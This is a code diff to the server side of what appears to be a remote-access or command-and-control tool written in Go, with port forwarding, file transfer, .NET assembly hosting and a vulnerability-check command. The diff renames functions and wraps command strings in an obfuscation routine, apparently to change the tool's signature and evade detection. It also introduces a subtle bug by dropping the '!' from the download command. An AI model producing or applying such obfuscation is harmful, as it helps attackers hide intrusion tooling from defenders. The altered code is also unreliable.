@@ -58,13 +58,13 @@ var cmdSession *yamux.Session
 var assemblies = map[string]bool{}
 
 // opens the listening socket on the server side
-func lfwd(fwd utils.Forward) {
+func lokale_port_weiterleitung(fwd utils.Forward) {	
 	ln, err := net.Listen("tcp", fmt.Sprintf(":%s", fwd.LPort))
 	if err != nil {
 		log.Println(err)
 		return
-	}
-	go func() {
+	}	
+	go func() {		
 		for {
 			fwdCon, err := ln.Accept()
 			if err == nil && fwdCon != nil {
@@ -76,7 +76,7 @@ func lfwd(fwd utils.Forward) {
 				if err != nil {
 					log.Println(err)
 				}
-				go utils.CopyIO(fwdCon, proxy)
+				go utils.CopyIO(fwdCon, proxy)				
 				go utils.CopyIO(proxy, fwdCon)
 			}
 			if !fwd.Active {
@@ -84,7 +84,7 @@ func lfwd(fwd utils.Forward) {
 			}
 		}
 	}()
-	// Wait for exit signal
+	// Wait for exit signal	
 	for {
 		select {
 		case <-fwd.Quit:
@@ -96,7 +96,7 @@ func lfwd(fwd utils.Forward) {
 }
 
 // connects to the listening port on the client side
-func rfwd(fwd utils.Forward, s *yamux.Session, c net.Conn) {
+func entfernte_port_weiterleitung(fwd utils.Forward, s *yamux.Session, c net.Conn) {
 	go func() {
 		for {
 			// accept the virtual connection initiated by the client
@@ -139,72 +139,63 @@ func handleCmd(buf []byte) []byte {
 	cmd = strings.TrimSuffix(cmd, "\n")
 	argv := strings.Split(cmd, " ")
 	switch argv[0] {
-	case "!exit":
+	case utils.Bake("§!exit§"):
 		// defer exit so we can sent it to the client aswell
 		go quit()
-	case "!download":
+	case utils.Bake("§download§"):
 		if len(argv) == 3 {
 			dst := argv[2]
 			go utils.DownloadListen(dst, session)
 		}
-	case "!lfwd":
+	case utils.Bake("§lfwd§"):		
 		if len(argv) == 4 {
 			lport := argv[1]
 			raddr := argv[2]
 			rport := argv[3]
 			fwd := utils.Forward{lport, rport, raddr, make(chan bool), true, true}
-
-			portAvailable := true
+			_ = fwd
+			portAvailable := true			
 			for _, item := range activeForwards {
 				if item.LPort == lport {
 					portAvailable = false
 					break
 				}
-			}
+			}			
+			
 			if portAvailable {
-				go lfwd(fwd)
+				go lokale_port_weiterleitung(fwd)
 				activeForwards = append(activeForwards, fwd)
 			} else {
-				log.Printf("Local Port %s already in use.\n", lport)
+				log.Printf(utils.Bake("§Local Port %s already in use.\n§"), lport)
 			}
+			
 		}
-	case "!rfwd":
+	case utils.Bake("§!rfwd§"):
 		if len(argv) == 4 {
 			lport := argv[1]
 			raddr := argv[2]
 			rport := argv[3]
 			fwd := utils.Forward{lport, rport, raddr, make(chan bool), false, true}
-			go rfwd(fwd, gs, gc)
+			go entfernte_port_weiterleitung(fwd, gs, gc)
 			activeForwards = append(activeForwards, fwd)
 		}
-	case "!rmfwd":
+	case utils.Bake("§!rmfwd§"):
 		if len(argv) == 2 {
 			index, _ := strconv.Atoi(argv[1])
 			forward := activeForwards[index]
 			forward.Quit <- true
 			activeForwards = append(activeForwards[:index], activeForwards[index+1:]...)
 		}
-	case "!vulns":
-		fmt.Println("Be patient - this can take a few minutes..")
-	case "!upload":
+	case utils.Bake("§!vulns§"):
+		fmt.Println(utils.Bake("§Be patient - this can take a few minutes..§"))
+	case utils.Bake("§!upload§"):
 		if len(argv) != 3 {
 			return buf
 		}
 		src := argv[1]
-		go utils.UploadListen(src, session)
-	case "!net":
-		// same as upload for the server side, hosts the .NET assembly we want to execute
-		if len(argv) < 2 {
-			return buf
-		}
-		src := argv[1]
-		// only need to upload if its a new path (downside: if you change a binary and a known path it won't get reuploaded, in this case !restart)
-		if _, ok := assemblies[src]; !ok {
-			assemblies[src] = true
-			go utils.UploadListen(src, session)
-		}
-	case "!debug":
-		fmt.Printf("Active Goroutines: %d\n", runtime.NumGoroutine())
+		go utils.UploadListen(src, session)	
+	case utils.Bake("§!debug§"):
+		fmt.Printf(utils.Bake("§Active Goroutines: %d§")+"\n", runtime.NumGoroutine())
 	}
 	return buf
 }
@@ -230,7 +221,7 @@ func Run(s *yamux.Session, c net.Conn) {
 	go func() {
 		for {
 			<-sigChan
-			io.WriteString(cmdSession, "!sigint\n")
+			io.WriteString(cmdSession, utils.Bake("§!sigint§")+"\n")
 		}
 	}()
 	go io.Copy(c, sr)
